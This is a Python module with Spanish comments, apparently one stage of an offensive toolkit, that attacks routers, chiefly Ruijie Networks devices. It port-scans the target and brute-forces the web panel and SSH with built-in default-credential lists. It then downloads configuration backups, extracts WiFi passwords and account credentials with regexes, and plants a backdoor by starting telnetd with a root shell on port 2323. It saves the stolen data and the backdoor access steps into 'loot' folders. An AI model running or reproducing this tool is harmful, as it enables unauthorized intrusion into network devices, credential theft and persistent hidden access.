#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Módulo 3: Router Exploitation
Explota vulnerabilidades en routers, especialmente Ruijie Networks
"""

import json
import os
import time
import socket
import requests
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import threading
from pathlib import Path
import paramiko
import subprocess

class RouterExploit:
    """Clase para explotar routers de la red"""
    
    # Credenciales por defecto de Ruijie Networks
    RUIJIE_DEFAULT_CREDS = [
        ('admin', 'admin'),
        ('admin', ''),
        ('admin', 'admin123'),
        ('admin', 'password'),
        ('admin', 'ruijie'),
        ('admin', 'ruijie123'),
        ('root', 'admin'),
        ('root', 'password'),
        ('guest', 'guest'),
    ]
    
    # Credenciales comunes genéricas
    COMMON_CREDS = [
        ('admin', 'admin'),
        ('admin', ''),
        ('admin', 'password'),
        ('admin', '1234'),
        ('admin', '12345'),
        ('admin', '123456'),
        ('root', 'root'),
        ('root', 'admin'),
        ('root', 'password'),
        ('user', 'user'),
    ]
    
    def __init__(self, target_ip: str, output_dir: str = "reports"):
        """
        Inicializa el módulo de explotación de router
        
        Args:
            target_ip: IP del router objetivo
            output_dir: Directorio para guardar informes
        """
        self.target_ip = target_ip
        self.output_dir = output_dir
        self.loot_dir = "loot/router_configs"
        self.backdoor_dir = "loot/backdoors"
        
        # Crear directorios
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        Path(self.loot_dir).mkdir(parents=True, exist_ok=True)
        Path(self.backdoor_dir).mkdir(parents=True, exist_ok=True)
        
        # Cargar configuración
        self.config = self._load_config()
        
        # Estructura del informe
        self.report = {
            "module": "Router Exploitation",
            "target": target_ip,
            "vendor": "Ruijie Networks Co.,LTD",
            "timestamp": datetime.now().isoformat(),
            "start_time": datetime.now().isoformat(),
            "end_time": None,
            "duration_seconds": 0,
            "status": "IN_PROGRESS",
            "vulnerabilities_found": [],
            "access_obtained": False,
            "valid_credentials": None,
            "actions_performed": [],
            "loot": {
                "config_files": [],
                "wifi_passwords": [],
                "extracted_credentials": [],
                "sensitive_data": []
            },
            "backdoor": {
                "installed": False,
                "type": None,
                "access_method": None,
                "credentials": None,
                "instructions": []
            },
            "recommendations": []
        }
    
    def _load_config(self) -> Dict:
        """Carga configuración desde config.env"""
        config = {
            'backdoor_user': 'backdoor_admin',
            'backdoor_pass': 'Secure!Backend2024',
            'backdoor_port': 2222,
            'attack_delay': 0.5,
            'verbose': True
        }
        
        try:
            if os.path.exists('config.env'):
                with open('config.env', 'r') as f:
                    for line in f:
                        if '=' in line and not line.startswith('#'):
                            key, value = line.strip().split('=', 1)
                            if 'BACKDOOR_USER' in key:
                                config['backdoor_user'] = value
                            elif 'BACKDOOR_PASS' in key:
                                config['backdoor_pass'] = value
                            elif 'BACKDOOR_PORT' in key:
                                config['backdoor_port'] = int(value)
                            elif 'ATTACK_DELAY' in key:
                                config['attack_delay'] = float(value)
        except Exception as e:
            print(f"[!] No se pudo cargar config.env, usando valores por defecto: {e}")
        
        return config
    
    def _save_report(self):
        """Guarda el informe en JSON"""
        try:
            output_file = os.path.join(self.output_dir, "informe_router_exploitation.json")
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(self.report, f, indent=4, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error guardando informe: {e}")
    
    def run_exploitation(self) -> Dict:
        """
        Ejecuta el proceso completo de explotación del router
        
        Returns:
            Diccionario con el informe completo
        """
        print(f"\n{'='*70}")
        print(f"  MÓDULO 3: ROUTER EXPLOITATION")
        print(f"{'='*70}")
        print(f"[*] Objetivo: {self.target_ip}")
        print(f"[*] Vendor: Ruijie Networks Co.,LTD\n")
        
        start_time = time.time()
        
        try:
            # 1. Verificar si el router está activo
            if not self._check_host_alive():
                print(f"[!] El host {self.target_ip} no responde")
                self.report['status'] = 'FAILED'
                self.report['vulnerabilities_found'].append({
                    "type": "Host Unreachable",
                    "severity": "INFO",
                    "details": "El router no responde a pings"
                })
                return self.report
            
            # 2. Escanear puertos del router
            print(f"[*] Escaneando puertos del router...")
            open_ports = self._scan_router_ports()
            print(f"    [✓] Puertos abiertos: {', '.join(map(str, open_ports))}")
            
            # 3. Intentar explotación HTTP/HTTPS (puertos 80/443)
            if 80 in open_ports or 443 in open_ports:
                print(f"\n[*] Intentando explotación vía HTTP/HTTPS...")
                http_result = self._exploit_http_panel()
                
                if http_result['success']:
                    self.report['access_obtained'] = True
                    self.report['valid_credentials'] = http_result['credentials']
                    self.report['actions_performed'].append("Acceso obtenido vía panel web")
                    
                    # 4. Si se obtiene acceso, intentar acciones post-explotación
                    self._post_exploitation_http(http_result)
            
            # 5. Intentar explotación SSH (si está disponible)
            if 22 in open_ports or self.config['backdoor_port'] in open_ports:
                print(f"\n[*] Intentando explotación vía SSH...")
                ssh_result = self._exploit_ssh()
                
                if ssh_result['success']:
                    self.report['access_obtained'] = True
                    if not self.report['valid_credentials']:
                        self.report['valid_credentials'] = ssh_result['credentials']
                    self.report['actions_performed'].append("Acceso obtenido vía SSH")
                    
                    # Post-explotación SSH
                    self._post_exploitation_ssh(ssh_result)
            
            # 6. Intentar explotación Telnet (puerto 23)
            if 23 in open_ports:
                print(f"\n[*] Telnet detectado (puerto 23)...")
                self.report['vulnerabilities_found'].append({
                    "type": "Insecure Service",
                    "severity": "HIGH",
                    "details": "Telnet está habilitado (protocolo inseguro)"
                })
            
            # 7. Verificar vulnerabilidades de lighttpd
            if 80 in open_ports or 443 in open_ports:
                self._check_lighttpd_vulnerabilities()
            
            # 8. Intentar instalar backdoor si se obtuvo acceso
            if self.report['access_obtained']:
                print(f"\n[*] Intentando instalar backdoor...")
                self._install_backdoor()
            
            # Determinar estado final
            if self.report['access_obtained']:
                self.report['status'] = 'SUCCESS'
                print(f"\n[✓] EXPLOTACIÓN EXITOSA")
            elif len(self.report['vulnerabilities_found']) > 0:
                self.report['status'] = 'PARTIAL'
                print(f"\n[!] EXPLOTACIÓN PARCIAL - Vulnerabilidades encontradas")
            else:
                self.report['status'] = 'FAILED'
                print(f"\n[✗] EXPLOTACIÓN FALLIDA")
        
        except KeyboardInterrupt:
            print(f"\n[!] Explotación interrumpida por el usuario")
            self.report['status'] = 'INTERRUPTED'
        
        except Exception as e:
            print(f"\n[!] Error durante la explotación: {e}")
            self.report['status'] = 'ERROR'
            import traceback
            traceback.print_exc()
        
        finally:
            # Finalizar informe
            end_time = time.time()
            self.report['end_time'] = datetime.now().isoformat()
            self.report['duration_seconds'] = round(end_time - start_time, 2)
            
            # Agregar recomendaciones
            self._add_recommendations()
            
            # Guardar informe
            self._save_report()
            
            print(f"\n{'='*70}")
            print(f"  RESUMEN DE EXPLOTACIÓN")
            print(f"{'='*70}")
            print(f"Estado: {self.report['status']}")
            print(f"Acceso obtenido: {'SÍ' if self.report['access_obtained'] else 'NO'}")
            print(f"Vulnerabilidades: {len(self.report['vulnerabilities_found'])}")
            print(f"Backdoor instalado: {'SÍ' if self.report['backdoor']['installed'] else 'NO'}")
            print(f"Duración: {self.report['duration_seconds']} segundos")
            print(f"Informe: {self.output_dir}/informe_router_exploitation.json")
            print(f"{'='*70}\n")
        
        return self.report
    
    def _check_host_alive(self) -> bool:
        """Verifica si el host está vivo"""
        try:
            # Intenta conectar al puerto 80
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, 80))
            sock.close()
            return result == 0
        except:
            return False
    
    def _scan_router_ports(self) -> List[int]:
        """Escanea puertos comunes del router"""
        common_ports = [22, 23, 80, 443, 8080, 8443, 2222]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
            except:
                pass
        
        return open_ports
    
    def _exploit_http_panel(self) -> Dict:
        """Intenta explotar el panel web del router"""
        result = {
            'success': False,
            'credentials': None,
            'session': None,
            'urls': []
        }
        
        # Intentar HTTP y HTTPS
        protocols = ['http', 'https']
        
        for protocol in protocols:
            base_url = f"{protocol}://{self.target_ip}"
            
            try:
                # Verificar si el servidor responde
                response = requests.get(base_url, timeout=5, verify=False)
                print(f"    [✓] Servidor web respondiendo en {protocol.upper()}")
                result['urls'].append(base_url)
                
                # Intentar credenciales por defecto de Ruijie
                print(f"    [*] Probando credenciales de Ruijie Networks...")
                for username, password in self.RUIJIE_DEFAULT_CREDS:
                    if self._try_http_login(base_url, username, password):
                        print(f"    [✓✓✓] ¡ACCESO OBTENIDO! - {username}:{password}")
                        result['success'] = True
                        result['credentials'] = {'user': username, 'pass': password}
                        
                        self.report['vulnerabilities_found'].append({
                            "type": "Default Credentials",
                            "severity": "CRITICAL",
                            "details": f"Router acepta credenciales por defecto de Ruijie: {username}:{password}",
                            "credentials": result['credentials']
                        })
                        
                        return result
                    
                    time.sleep(self.config['attack_delay'])
                
                # Intentar credenciales comunes
                print(f"    [*] Probando credenciales comunes...")
                for username, password in self.COMMON_CREDS:
                    if self._try_http_login(base_url, username, password):
                        print(f"    [✓✓✓] ¡ACCESO OBTENIDO! - {username}:{password}")
                        result['success'] = True
                        result['credentials'] = {'user': username, 'pass': password}
                        
                        self.report['vulnerabilities_found'].append({
                            "type": "Weak Credentials",
                            "severity": "CRITICAL",
                            "details": f"Router acepta credenciales débiles: {username}:{password}",
                            "credentials": result['credentials']
                        })
                        
                        return result
                    
                    time.sleep(self.config['attack_delay'])
            
            except requests.exceptions.RequestException:
                continue
        
        return result
    
    def _try_http_login(self, base_url: str, username: str, password: str) -> bool:
        """
        Intenta login HTTP con credenciales específicas
        Prueba múltiples endpoints comunes de routers
        """
        # Endpoints comunes de login
        login_endpoints = [
            '/login.cgi',
            '/login.php',
            '/login.html',
            '/cgi-bin/login',
            '/goform/login',
            '/userRpm/LoginRpm.htm',
            '/api/login',
            '/',
        ]
        
        # Métodos de autenticación
        methods = [
            'basic_auth',
            'form_post',
            'digest_auth'
        ]
        
        for endpoint in login_endpoints:
            url = base_url + endpoint
            
            try:
                # Método 1: Basic Auth
                response = requests.get(
                    url,
                    auth=(username, password),
                    timeout=3,
                    verify=False
                )
                
                if response.status_code == 200 and 'logout' in response.text.lower():
                    return True
                
                # Método 2: Form POST
                data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login',
                }
                
                response = requests.post(
                    url,
                    data=data,
                    timeout=3,
                    verify=False
                )
                
                if response.status_code == 200 and ('success' in response.text.lower() or 'logout' in response.text.lower()):
                    return True
            
            except:
                continue
        
        return False
    
    def _post_exploitation_http(self, http_result: Dict):
        """Acciones post-explotación vía HTTP"""
        print(f"    [*] Ejecutando post-explotación HTTP...")
        
        base_url = http_result['urls'][0]
        creds = http_result['credentials']
        
        # Intentar descargar configuración
        config_endpoints = [
            '/cgi-bin/ExportSettings.sh',
            '/backup.bin',
            '/config.bin',
            '/cgi-bin/config.bin',
            '/download/config',
        ]
        
        for endpoint in config_endpoints:
            try:
                response = requests.get(
                    base_url + endpoint,
                    auth=(creds['user'], creds['pass']),
                    timeout=5,
                    verify=False
                )
                
                if response.status_code == 200 and len(response.content) > 100:
                    # Guardar configuración
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    config_file = os.path.join(self.loot_dir, f"ruijie_backup_{timestamp}.bin")
                    
                    with open(config_file, 'wb') as f:
                        f.write(response.content)
                    
                    print(f"    [✓] Configuración descargada: {config_file}")
                    self.report['loot']['config_files'].append(config_file)
                    self.report['actions_performed'].append(f"Configuración del router descargada ({len(response.content)} bytes)")
                    
                    # Intentar extraer credenciales
                    self._extract_credentials_from_config(config_file)
                    break
            
            except:
                continue
    
    def _extract_credentials_from_config(self, config_file: str):
        """Extrae credenciales del archivo de configuración"""
        try:
            with open(config_file, 'rb') as f:
                content = f.read()
            
            # Intentar decodificar como texto
            try:
                text = content.decode('utf-8', errors='ignore')
            except:
                text = content.decode('latin-1', errors='ignore')
            
            # Buscar patrones de credenciales WiFi
            wifi_patterns = [
                r'wpa[_-]?psk[_-]?key[=:\s]+([^\s\n\r]+)',
                r'wireless[_-]?password[=:\s]+([^\s\n\r]+)',
                r'wifi[_-]?pass(word)?[=:\s]+([^\s\n\r]+)',
                r'ssid[_-]?key[=:\s]+([^\s\n\r]+)',
            ]
            
            import re
            
            for pattern in wifi_patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        password = match if isinstance(match, str) else match[0]
                        if len(password) > 6:
                            print(f"    [✓✓✓] Contraseña WiFi encontrada: {password}")
                            self.report['loot']['wifi_passwords'].append(password)
            
            # Buscar otras credenciales
            cred_patterns = [
                r'username[=:\s]+([^\s\n\r]+).*password[=:\s]+([^\s\n\r]+)',
                r'user[=:\s]+([^\s\n\r]+).*pass[=:\s]+([^\s\n\r]+)',
            ]
            
            for pattern in cred_patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                if matches:
                    for user, passwd in matches:
                        self.report['loot']['extracted_credentials'].append({
                            "service": "Router",
                            "user": user,
                            "pass": passwd
                        })
        
        except Exception as e:
            print(f"    [!] Error extrayendo credenciales: {e}")
    
    def _exploit_ssh(self) -> Dict:
        """Intenta explotar SSH"""
        result = {
            'success': False,
            'credentials': None,
            'client': None
        }
        
        # Intentar con credenciales
        all_creds = self.RUIJIE_DEFAULT_CREDS + self.COMMON_CREDS
        
        for username, password in all_creds:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                client.connect(
                    self.target_ip,
                    port=22,
                    username=username,
                    password=password,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False
                )
                
                print(f"    [✓✓✓] ¡ACCESO SSH OBTENIDO! - {username}:{password}")
                result['success'] = True
                result['credentials'] = {'user': username, 'pass': password}
                result['client'] = client
                
                self.report['vulnerabilities_found'].append({
                    "type": "SSH Weak Credentials",
                    "severity": "CRITICAL",
                    "details": f"SSH acepta credenciales débiles: {username}:{password}",
                    "credentials": result['credentials']
                })
                
                return result
            
            except:
                pass
            
            time.sleep(self.config['attack_delay'])
        
        return result
    
    def _post_exploitation_ssh(self, ssh_result: Dict):
        """Acciones post-explotación vía SSH"""
        print(f"    [*] Ejecutando post-explotación SSH...")
        
        client = ssh_result['client']
        
        try:
            # Obtener información del sistema
            stdin, stdout, stderr = client.exec_command('cat /etc/version || uname -a')
            version_info = stdout.read().decode('utf-8', errors='ignore')
            if version_info:
                print(f"    [✓] Versión del sistema: {version_info.strip()}")
                self.report['loot']['sensitive_data'].append({
                    "type": "System Version",
                    "data": version_info.strip()
                })
            
            # Intentar obtener configuración
            stdin, stdout, stderr = client.exec_command('cat /etc/config/* 2>/dev/null || cat /flash/config.xml 2>/dev/null')
            config_data = stdout.read()
            
            if config_data and len(config_data) > 100:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                config_file = os.path.join(self.loot_dir, f"ruijie_ssh_config_{timestamp}.txt")
                
                with open(config_file, 'wb') as f:
                    f.write(config_data)
                
                print(f"    [✓] Configuración obtenida vía SSH")
                self.report['loot']['config_files'].append(config_file)
                self.report['actions_performed'].append("Configuración obtenida vía SSH")
                
                # Extraer credenciales
                self._extract_credentials_from_config(config_file)
        
        except Exception as e:
            print(f"    [!] Error en post-explotación SSH: {e}")
    
    def _check_lighttpd_vulnerabilities(self):
        """Verifica vulnerabilidades conocidas de lighttpd"""
        print(f"    [*] Verificando vulnerabilidades de lighttpd...")
        
        # Agregar vulnerabilidad genérica
        self.report['vulnerabilities_found'].append({
            "type": "Outdated Web Server",
            "severity": "MEDIUM",
            "details": "El servidor web lighttpd puede tener vulnerabilidades conocidas. Verificar versión específica."
        })
    
    def _install_backdoor(self):
        """Intenta instalar backdoor en el router"""
        print(f"    [*] Instalando backdoor...")
        
        # Si tenemos acceso SSH, intentar crear backdoor
        if self.report['valid_credentials']:
            creds = self.report['valid_credentials']
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                client.connect(
                    self.target_ip,
                    port=22,
                    username=creds['user'],
                    password=creds['pass'],
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False
                )
                
                # Intentar habilitar telnet
                stdin, stdout, stderr = client.exec_command('telnetd -l /bin/sh -p 2323 2>/dev/null &')
                time.sleep(2)
                
                # Verificar si telnet está activo
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target_ip, 2323))
                sock.close()
                
                if result == 0:
                    print(f"    [✓✓✓] Backdoor telnet instalado en puerto 2323")
                    self.report['backdoor']['installed'] = True
                    self.report['backdoor']['type'] = 'Telnet'
                    self.report['backdoor']['access_method'] = f'telnet {self.target_ip} 2323'
                    self.report['backdoor']['credentials'] = creds
                    self.report['backdoor']['instructions'] = [
                        f"Conectar vía telnet:",
                        f"  telnet {self.target_ip} 2323",
                        f"Credenciales: {creds['user']} / {creds['pass']}"
                    ]
                    self.report['actions_performed'].append("Backdoor telnet instalado exitosamente")
                    
                    # Guardar instrucciones
                    self._save_backdoor_instructions()
                else:
                    print(f"    [!] No se pudo instalar backdoor telnet")
                
                client.close()
            
            except Exception as e:
                print(f"    [!] Error instalando backdoor: {e}")
    
    def _save_backdoor_instructions(self):
        """Guarda instrucciones de acceso al backdoor"""
        instructions_file = os.path.join(self.backdoor_dir, "router_backdoor_access.txt")
        
        try:
            with open(instructions_file, 'w', encoding='utf-8') as f:
                f.write("="*70 + "\n")
                f.write("  INSTRUCCIONES DE ACCESO - ROUTER BACKDOOR\n")
                f.write("="*70 + "\n\n")
                f.write(f"Objetivo: {self.target_ip}\n")
                f.write(f"Tipo: {self.report['backdoor']['type']}\n")
                f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                f.write("MÉTODO DE ACCESO:\n")
                f.write(f"  {self.report['backdoor']['access_method']}\n\n")
                
                if self.report['backdoor']['credentials']:
                    creds = self.report['backdoor']['credentials']
                    f.write("CREDENCIALES:\n")
                    f.write(f"  Usuario: {creds['user']}\n")
                    f.write(f"  Contraseña: {creds['pass']}\n\n")
                
                f.write("INSTRUCCIONES:\n")
                for instruction in self.report['backdoor']['instructions']:
                    f.write(f"  {instruction}\n")
                
                f.write("\n" + "="*70 + "\n")
            
            print(f"    [✓] Instrucciones guardadas en: {instructions_file}")
        
        except Exception as e:
            print(f"    [!] Error guardando instrucciones: {e}")
    
    def _add_recommendations(self):
        """Agrega recomendaciones de seguridad"""
        recommendations = [
            "Cambiar TODAS las credenciales por defecto inmediatamente",
            "Actualizar firmware del router a la última versión disponible",
            "Deshabilitar acceso web desde WAN (Internet)",
            "Deshabilitar Telnet y usar solo SSH con claves públicas",
            "Implementar contraseñas fuertes (mínimo 16 caracteres)",
            "Habilitar logging y monitoreo de intentos de acceso",
            "Configurar firewall para bloquear puertos de administración desde externa",
            "Cambiar puerto SSH por defecto",
            "Implementar autenticación de dos factores si está disponible",
            "Realizar auditorías de seguridad periódicas"
        ]
        
        self.report['recommendations'] = recommendations

